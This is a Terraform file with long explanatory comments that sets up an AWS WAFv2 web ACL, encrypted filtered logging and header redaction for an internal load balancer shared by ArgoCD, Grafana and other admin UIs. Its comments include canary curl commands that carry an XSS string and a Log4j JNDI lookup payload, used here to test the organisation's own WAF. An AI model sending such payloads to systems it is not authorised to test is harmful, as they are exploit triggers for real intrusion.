################################################################################
# AWS WAFv2 web ACL for the shared internal web-UI ALB — NIST 800-171 §3.13.x
# (SC family), via Security Hub control ELB.16
#
# WHY THIS FILE EXISTS
#
# Security Hub reported exactly two FAILED control findings against the one load
# balancer in this account — `k8s-cloudpipeui-*`, the internal ALB that ArgoCD, Argo
# Workflows, Prefect, Kubecost and Grafana share through the `cloudpipe-ui`
# IngressGroup (ui_alb.tf):
#
#   ELB.16  Application Load Balancers should be associated with an AWS WAF
#           web ACL                                     NIST.800-53.r5 AC-4(21)
#   ELB.6   Application, Gateway, and Network Load Balancers should have deletion
#           protection enabled                          CA-9(1), CM-2, CM-3, SC-5(2)
#
# Both came from the **NIST 800-53 Rev. 5** standard, the only one subscribed in
# this account. An earlier version of this comment credited the 800-171 Rev. 2
# standard, which has never been enabled here and cannot be enabled from here: the
# account is an organization member under Security Hub central configuration, so
# `BatchEnableStandards` is denied to it (POA&M PG-5a-i, requested from the
# organization 2026-09-24; the reasoning and the preserved ARN form are in
# security_findings.tf). The control citations above are 800-53 for the same reason.
#
# This is a mislabelling, not a gap in coverage, and the distinction matters when
# citing these findings as compliance evidence. **800-171 Rev. 2 defines no controls
# of its own — it selects from 800-53, and its Appendix D publishes the crosswalk**,
# so 800-53 r5 is the parent framework and its evaluation is the evidence. What is
# missing is only the label: findings carry no `NIST.800-171.r2/3.x.x` strings and
# there is no per-800-171-requirement score. Cite these as 800-53 r5 findings that
# map to 800-171 via Appendix D. Do not cite Security Hub as producing
# 800-171-attributed evidence until `RelatedRequirements` actually says so.
#
# This file answers ELB.16. ELB.6 is a single load-balancer attribute and lives
# with the other ALB attributes in local.ui_alb_group_annotations (ui_alb.tf).
#
# THERE IS DELIBERATELY NO aws_wafv2_web_acl_association HERE
#
# The ALB is not a Terraform resource. The AWS Load Balancer Controller creates it
# from the IngressGroup, so Terraform never learns its ARN and cannot associate
# anything with it. Association is instead requested by the
# `alb.ingress.kubernetes.io/wafv2-acl-arn` annotation on the ArgoCD Ingress
# (argocd.tf), which Terraform *does* render — so the ARN below still flows from
# Terraform to the association, just through the controller instead of the ELB
# API. Adding an `aws_wafv2_web_acl_association` would mean looking the ALB up by
# tag in a data source and would then fight the controller over the same
# association on every reconcile. Do not add one.
#
# The controller already holds `wafv2:AssociateWebACL`, `wafv2:GetWebACLForResource`
# and `wafv2:DisassociateWebACL` on `*` in its attached policy
# (AmazonEKS_LoadBalancerController-*), so no IAM change is needed. This was
# checked before writing the annotation rather than assumed: an IAM denial on a
# group-level annotation stops the controller reconciling the WHOLE IngressGroup,
# which would take all five UIs down at once, not just one.
#
# ADDING A WEB ACL OPENS THREE MORE CONTROLS, SO ALL THREE ARE ANSWERED HERE
#
#   WAF.10  web ACLs should have at least one rule or rule group  -> two managed
#           rule groups below
#   WAF.11  web ACL logging should be enabled                     -> the logging
#           configuration below
#   WAF.12  rules should have CloudWatch metrics enabled          -> every
#           visibility_config sets cloudwatch_metrics_enabled = true
#
# An empty ACL with no logging would have closed ELB.16 and opened those three.
#
# WHAT THIS WAF CAN AND CANNOT SEE
#
# The ALB is internal, so every client address WAF observes is private and belongs
# to whatever forwarded the request — a cloudflared pod for operators on WARP, the
# calling pod for in-cluster traffic to Dex, the Client VPN's source-NAT address
# for the fallback path. Consequences:
#
#   - IP-based rules are near-useless. AWSManagedRulesAmazonIpReputationList is
#     deliberately NOT included: a reputation list never matches an RFC 1918
#     address, so it would cost $1/month to evaluate nothing.
#   - Rate-based rules are actively dangerous. Keyed on IP they would aggregate
#     every operator behind one cloudflared pod address, so one person clicking
#     through the Argo UI could rate-limit everybody. Not included, on purpose.
#
# What is left — and what these rule groups actually provide — is payload
# inspection: known-bad inputs (Log4j JNDI strings, malformed host headers,
# traversal in the URI) and the Core rule set's generic injection signatures.
# That is a real control against a compromised pod or a compromised operator
# laptop inside the tunnel, which is the threat model an internal ALB still has.
#
# COST
#
# $5.00/month for the web ACL, $1.00/month per managed rule group ($2.00), and
# $0.60 per million inspected requests. Logging is filtered to BLOCK/COUNT records
# only (see below), so CloudWatch ingestion is a rounding error rather than the
# dominant line item it would be if every Grafana panel poll were logged.
#
# Web ACL capacity: Core rule set is 700 WCU and Known Bad Inputs is 200 WCU, so
# 900 of the 1,500 WCU default. A third managed group may not fit; check
# `aws wafv2 describe-managed-rule-group` before adding one.
################################################################################

locals {
  # CloudWatch Logs will only accept a WAF logging destination whose log-group
  # name starts with `aws-waf-logs-`. Held as a local because the KMS key policy
  # below scopes to this name and the log group reads that key — referencing the
  # resource in both directions would be a cycle.
  ui_waf_log_group_name = "aws-waf-logs-cloudpipe-ui"

  # Promotion switch for the Core rule set. FALSE means the whole group runs in
  # Count mode: it matches, emits metrics and log records, and lets the request
  # through. TRUE means a match blocks, with a bare 403 and no explanation.
  #
  # PROMOTED to true on 2026-09-24, after a Count period whose review came back
  # clean. It shipped as false for a reason that still governs any future change
  # here: this ALB is the only route to ArgoCD and the Argo UI, so a Core-rule
  # false positive does not degrade a public site, it locks the operator out of
  # the control plane.
  #
  # ROLLBACK is this one line back to false, then
  # `terraform apply -target=aws_wafv2_web_acl.ui_alb`. It changes no Ingress
  # annotation and does not move the ACL ARN, so unlike the group-annotation
  # changes it carries NO IngressGroup reconciliation freeze.
  #
  # THE EVIDENCE behind the flip, measured 2026-09-23/24:
  #   - 429 real requests across all five IngressGroup members (ArgoCD, Argo,
  #     Grafana, Kubecost, Prefect), 116 of them POSTs, with `CountedRequests`
  #     flat at zero for the whole window.
  #   - the POST paths that carry bodies were exercised for real, not simulated:
  #     Grafana panel queries (`POST /api/ds/query`, Athena SQL inside JSON)
  #     x20, Prefect's filter API x76, and a live
  #     `POST /api/v1/applications/argo-workflows/sync`.
  #   - real 44-62 kB dashboard JSON and workflow-template YAML, POSTed as
  #     canary bodies, matched nothing that could block; only the permanently
  #     overridden SizeRestrictions_BODY fired (every one of those bodies
  #     exceeds WAF's 8 kB inspection window, and content past it is invisible
  #     to every rule, so it cannot block either).
  #   - known-bad-inputs confirmed genuinely blocking: Log4j JNDI canary -> 403.
  #
  # APPLIED and VERIFIED 2026-09-24, against the API and by canary rather than
  # from what the apply reported:
  #   - `get-web-acl` shows common-rule-set on `None` with all four
  #     RuleActionOverrides still present. Check the overrides, not just the
  #     group action: an ACL that reads as promoted while those four have been
  #     flattened 403s every dashboard load, because Grafana's panel queries
  #     POST bodies past the 8 kB cap and trip SizeRestrictions_BODY.
  #   - `/waf-canary-core` with an XSS payload -> 403, where it was 404 before
  #     the apply; the same path WITHOUT the payload still 404s, so the 403 is
  #     attributable to the rule and not to blanket blocking. Keep that negative
  #     control: a promotion that broke routing would also return 403.
  #   - per-rule BlockedRequests = exactly 1 against each group (the two
  #     canaries), CountedRequests = 0.
  #   - all five UIs answered normally through the blocking ACL, and a 44 kB
  #     POST to /api/ds/query reached Grafana and returned Grafana's own 401,
  #     not a WAF 403 — the functional proof the body override still counts.
  #
  # PROMOTION PROCEDURE — the Logs Insights query that answers "what would have
  # been blocked", over the log group below. VERIFIED against known-positive
  # records on 2026-09-23; the query this replaces was verified to be wrong, see
  # the note after it.
  #
  #   fields coalesce(ruleGroupList.0.terminatingRule.ruleId,
  #                   ruleGroupList.1.terminatingRule.ruleId,
  #                   ruleGroupList.2.terminatingRule.ruleId) as wouldBlockRule
  #   | filter action = "ALLOW" and nonTerminatingMatchingRules.0.ruleId = "common-rule-set"
  #   | filter httpRequest.uri not like "waf-canary"
  #   | stats count(*) as hits, earliest(@timestamp) as firstSeen by wouldBlockRule, httpRequest.uri
  #   | sort hits desc
  #
  # Zero rows over a period that exercises the POST paths is the evidence to
  # flip it. Do NOT write "a dashboard save" into that bar, as an earlier
  # version of this comment did: Grafana's dashboards are provisioned from
  # gitops/apps/grafana/dashboards/, so the UI refuses to save them
  # ("provisioned from another source") and that request cannot occur here at
  # all. The achievable equivalents are a dashboard LOAD, which POSTs every
  # panel query to /api/ds/query; an ArgoCD sync; and a workflow submission, if
  # one is wanted badly enough to pay for the pods it starts. The four
  # rule-level overrides below stay at Count either way — they are
  # known-incompatible with these UIs, not merely unproven.
  #
  # READ THE RECORD SHAPE BEFORE EDITING THAT QUERY. It is not what it looks
  # like, and the previous version of this comment held a query that silently
  # could not find anything:
  #
  #   fields @timestamp, httpRequest.uri, terminatingRuleId
  #   | filter action = "ALLOW" and ispresent(ruleGroupList.0.terminatingRule)
  #   | stats count(*) by terminatingRuleId, httpRequest.uri
  #
  # Run against a log group holding two genuine counted Core matches, that
  # returns **zero rows** — and "zero rows is the evidence to flip it" would have
  # promoted the group on a false clean. Three facts, each measured from a real
  # record rather than read off the schema:
  #
  #   1. `ruleGroupList` is ordered by rule priority, so index 0 is
  #      known-bad-inputs, NOT the Core set. Its `terminatingRule` is null on a
  #      Core match, so `ispresent(ruleGroupList.0.terminatingRule)` drops
  #      exactly the records being looked for. Scope by our own rule name
  #      (`nonTerminatingMatchingRules.0.ruleId = "common-rule-set"`) instead —
  #      that is a Terraform-controlled string, not an array position that shifts
  #      the next time a rule group is added.
  #   2. `terminatingRuleId` is `Default_Action` on a counted match, because the
  #      request WAS allowed. It can never name the rule that matched, so
  #      grouping by it is meaningless here. The rule name is
  #      `ruleGroupList[<the Core group>].terminatingRule.ruleId`.
  #   3. Inside `ruleGroupList`, a counted rule is reported with
  #      `action: BLOCK` — the record states what the rule WOULD have done, and
  #      the Count override shows up only at top level as `action: ALLOW` plus
  #      `nonTerminatingMatchingRules: ["common-rule-set"]`. So filtering for
  #      `action = "COUNT"` inside the group also finds nothing. The legacy
  #      `excludedRules` field is null and is not populated at all.
  #   4. The two Count mechanisms log in DIFFERENT PLACES, and the query keys on
  #      the one that matters. A GROUP-level override — this switch — logs as
  #      described above. A RULE-level `rule_action_override`, the four below,
  #      instead logs as
  #      `ruleGroupList[].nonTerminatingMatchingRules: [{ruleId, action: COUNT}]`
  #      with the TOP-LEVEL `nonTerminatingMatchingRules` left EMPTY. So the
  #      review query never reports those four, and that is correct rather than a
  #      gap: they can never block, and listing them would make every review look
  #      dirty forever. Read a zero from it as "nothing that WOULD BLOCK
  #      matched", not "nothing matched".
  #
  # ESTABLISH A POSITIVE CONTROL BEFORE TRUSTING A ZERO. The log filter keeps
  # only BLOCK/COUNT/EXCLUDED_AS_COUNT and drops plain allows, so an empty log
  # group is indistinguishable from broken delivery. That is not hypothetical:
  # the ACL sat at zero requests of any kind for its first four hours, during
  # which the log group was empty for the most boring possible reason. Send
  # canaries from inside the VPC, straight at the ALB's own DNS name so
  # Cloudflare Access does not intercept them at the edge:
  #
  #   DNS=$(aws elbv2 describe-load-balancers \
  #     --query 'LoadBalancers[?starts_with(LoadBalancerName, `k8s-cloudpipeui`)].DNSName' \
  #     --output text)
  #   # counted by the Core set, so allowed -> expect 404 from the ALB
  #   curl -sk --get --data-urlencode 'q=<script>alert(1)</script>' "https://$DNS/waf-canary-core"
  #   # blocked by known-bad-inputs -> expect 403
  #   curl -sk --get --data-urlencode 'x=${jndi:ldap://example.invalid/a}' "https://$DNS/waf-canary-kbi"
  #
  # Records land in about 90 s. The canary URIs are the reason the review query
  # filters out `waf-canary` — they are permanent at 365-day retention and would
  # otherwise read as real findings later.
  ui_waf_common_ruleset_blocks = true
}

# ------------------------------------------------------------------------------
# The web ACL
# ------------------------------------------------------------------------------

resource "aws_wafv2_web_acl" "ui_alb" {
  name  = "cloudpipe-ui-alb"
  scope = "REGIONAL" # ALB is a regional resource. CLOUDFRONT scope cannot attach.

  # No parentheses, and no trailing period. CreateWebACL validates `description`
  # against ^[\w+=:#@/\-,\.][\w+=:#@/\-,\.\s]+[\w+=:#@/\-,\.]$ — brackets of any
  # kind are rejected outright, and the anchors require the last character to be
  # non-whitespace. The failure is a 400 ValidationException at apply time, not a
  # plan error, so it costs a round trip to discover.
  description = "Payload inspection for the shared internal web-UI ALB - cloudpipe-ui IngressGroup"

  # Allow by default. These are authenticated admin UIs behind Cloudflare Access
  # on a load balancer with no public address; the WAF is a second layer over
  # that, not the primary access control, and a default-deny here would break
  # every UI the moment a rule failed to match.
  default_action {
    allow {}
  }

  # --- Known Bad Inputs: blocking from the start ------------------------------
  # The low-false-positive group. Signatures for request components no legitimate
  # client sends — Log4j JNDI lookups, malformed host headers, traversal in the
  # URI, known exploit paths. Nothing in ArgoCD, Argo, Prefect, Kubecost or
  # Grafana produces these, so this group blocks immediately rather than waiting
  # out a Count period.
  rule {
    name     = "known-bad-inputs"
    priority = 1

    override_action {
      none {}
    }

    statement {
      managed_rule_group_statement {
        vendor_name = "AWS"
        name        = "AWSManagedRulesKnownBadInputsRuleSet"
      }
    }

    visibility_config {
      cloudwatch_metrics_enabled = true
      metric_name                = "cloudpipe-ui-alb-known-bad-inputs"
      sampled_requests_enabled   = false
    }
  }

  # --- Core rule set: Count until promoted, with four permanent exemptions ----
  rule {
    name     = "common-rule-set"
    priority = 2

    override_action {
      dynamic "none" {
        for_each = local.ui_waf_common_ruleset_blocks ? [1] : []
        content {}
      }
      dynamic "count" {
        for_each = local.ui_waf_common_ruleset_blocks ? [] : [1]
        content {}
      }
    }

    statement {
      managed_rule_group_statement {
        vendor_name = "AWS"
        name        = "AWSManagedRulesCommonRuleSet"

        # These four stay at Count even after the group is promoted. Each one is
        # a rule that admin UIs trip in normal use, not a rule that might.

        # 8 KB request-body cap. Argo Workflows submission YAML, ArgoCD
        # Application manifests and a saved Grafana dashboard JSON all exceed it
        # routinely; a saved dashboard is often hundreds of KB. Blocking this
        # would make "save dashboard" and "submit workflow" fail.
        rule_action_override {
          name = "SizeRestrictions_BODY"
          action_to_use {
            count {}
          }
        }

        # Query-string length cap. Grafana encodes dashboard and Explore state in
        # the URL (`?left={...}`, one `var-` parameter per template variable), so
        # a shared Explore link passes the limit without anything being wrong.
        rule_action_override {
          name = "SizeRestrictions_QUERYSTRING"
          action_to_use {
            count {}
          }
        }

        # Generic XSS signatures over the body. Dashboard JSON and workflow YAML
        # carry HTML fragments in panel descriptions and script blocks in
        # container commands; both read as XSS to a signature matcher.
        rule_action_override {
          name = "CrossSiteScripting_BODY"
          action_to_use {
            count {}
          }
        }

        # Remote file inclusion signatures over the body, which match on `://`.
        # Every ArgoCD Application posts a `repoURL`, and every workflow posts
        # container image references and artifact URLs.
        rule_action_override {
          name = "GenericRFI_BODY"
          action_to_use {
            count {}
          }
        }
      }
    }

    visibility_config {
      cloudwatch_metrics_enabled = true
      metric_name                = "cloudpipe-ui-alb-common-rule-set"
      sampled_requests_enabled   = false
    }
  }

  # `sampled_requests_enabled = false` everywhere, including here, and that is a
  # security choice rather than a cost one. WAF's sampled requests hold whole
  # requests for three hours and are readable by anyone with
  # `wafv2:GetSampledRequests` — and unlike the log records below they CANNOT be
  # redacted, so samples of these UIs would expose live Cloudflare Access JWTs
  # and Grafana session cookies. The filtered, redacted log group gives the same
  # tuning signal without that exposure.
  visibility_config {
    cloudwatch_metrics_enabled = true
    metric_name                = "cloudpipe-ui-alb"
    sampled_requests_enabled   = false
  }
}

# ------------------------------------------------------------------------------
# Log destination — CloudWatch Logs, encrypted, filtered, redacted
# ------------------------------------------------------------------------------

# A dedicated CMK rather than aws_kms_key.eks_logs. That key's policy would
# already permit this (its encryption-context condition is account-wide for
# CloudWatch Logs), but its description says "KMS key for EKS logs" and it has
# no key rotation — reusing it would both mislead the next reader and extend an
# unrotated key to a new purpose. This one is scoped to the single log group and
# rotates.
data "aws_iam_policy_document" "ui_waf_logs_kms" {
  statement {
    sid     = "EnableRootAccess"
    effect  = "Allow"
    actions = ["kms:*"]
    principals {
      type        = "AWS"
      identifiers = ["arn:${local.partition}:iam::${local.account_id}:root"]
    }
    resources = ["*"]
  }

  statement {
    sid    = "AllowCloudWatchLogs"
    effect = "Allow"
    actions = [
      "kms:Encrypt",
      "kms:Decrypt",
      "kms:ReEncrypt*",
      "kms:GenerateDataKey*",
      "kms:DescribeKey",
    ]
    principals {
      type        = "Service"
      identifiers = ["logs.${local.region}.amazonaws.com"]
    }
    resources = ["*"]
    # Scoped to this one log group. CloudWatch Logs sets the encryption context
    # to the log-group ARN; the trailing wildcard tolerates the `:*` suffix form
    # as well as the bare ARN. If this condition is ever wrong the failure is
    # loud and immediate — creating the log group returns "The specified KMS key
    # does not exist or is not allowed" — not a silent loss of logging.
    condition {
      test     = "ArnLike"
      variable = "kms:EncryptionContext:aws:logs:arn"
      values   = ["arn:${local.partition}:logs:${local.region}:${local.account_id}:log-group:${local.ui_waf_log_group_name}*"]
    }
  }
}

resource "aws_kms_key" "ui_waf_logs" {
  description             = "CMK for the ${local.ui_waf_log_group_name} WAF log group"
  deletion_window_in_days = 7
  enable_key_rotation     = true
  policy                  = data.aws_iam_policy_document.ui_waf_logs_kms.json
}

resource "aws_kms_alias" "ui_waf_logs" {
  name          = "alias/${local.name}-ui-waf-logs"
  target_key_id = aws_kms_key.ui_waf_logs.key_id
}

resource "aws_cloudwatch_log_group" "ui_waf" {
  name              = local.ui_waf_log_group_name
  retention_in_days = 365
  kms_key_id        = aws_kms_key.ui_waf_logs.arn
}

resource "aws_wafv2_web_acl_logging_configuration" "ui_alb" {
  resource_arn            = aws_wafv2_web_acl.ui_alb.arn
  log_destination_configs = [aws_cloudwatch_log_group.ui_waf.arn]

  # Log the interesting requests only. ALLOW with no rule match is the
  # overwhelming majority of traffic here — Grafana live panels re-poll every few
  # seconds per open dashboard and the Argo UI holds Server-Sent Events open —
  # and logging all of it would cost more in CloudWatch ingestion than the web
  # ACL itself while burying the records that matter.
  #
  # EXCLUDED_AS_COUNT is not redundant with COUNT: it is the condition that
  # matches a managed-rule-group rule overridden to Count, which is precisely
  # what the Core rule set is doing until it is promoted. Drop it and the Count
  # period produces nothing to read.
  logging_filter {
    default_behavior = "DROP"

    filter {
      behavior    = "KEEP"
      requirement = "MEETS_ANY"

      condition {
        action_condition {
          action = "BLOCK"
        }
      }
      condition {
        action_condition {
          action = "COUNT"
        }
      }
      condition {
        action_condition {
          action = "EXCLUDED_AS_COUNT"
        }
      }
    }
  }

  # WAF log records carry request headers verbatim. On these UIs that means the
  # Cloudflare Access identity JWT (`Cf-Access-Jwt-Assertion` arrives as a
  # cookie) and the ArgoCD, Argo and Grafana session cookies — live credentials.
  # Redact them, or enabling logging to satisfy WAF.11 would hand anyone with
  # CloudWatch read access a year of replayable sessions.
  #
  # Header names must be lowercase here; WAF matches them case-insensitively but
  # the API rejects mixed case.
  #
  # The query string is deliberately NOT redacted: it is the only way to diagnose
  # a SizeRestrictions_QUERYSTRING count, and Grafana and ArgoCD put dashboard
  # state there, not tokens.
  redacted_fields {
    single_header {
      name = "authorization"
    }
  }
  redacted_fields {
    single_header {
      name = "cookie"
    }
  }
}

# ------------------------------------------------------------------------------
# Outputs
# ------------------------------------------------------------------------------

output "ui_alb_waf_web_acl_arn" {
  description = <<-EOT
    Web ACL associated with the shared internal UI ALB by the load balancer
    controller. Verify the association actually happened — Terraform cannot,
    because it does not own it:

      aws wafv2 get-web-acl-for-resource --resource-arn \
        $(aws elbv2 describe-load-balancers \
            --query 'LoadBalancers[?starts_with(LoadBalancerName, `k8s-cloudpipeui`)].LoadBalancerArn' \
            --output text)

    An empty response means the controller has not reconciled the annotation yet,
    or has errored on it; `kubectl -n argocd describe ingress argocd-ingress` shows
    the error. Note that a web ACL cannot be deleted while still associated, so a
    `terraform destroy` of this file requires removing the annotation first.
  EOT
  value       = aws_wafv2_web_acl.ui_alb.arn
}
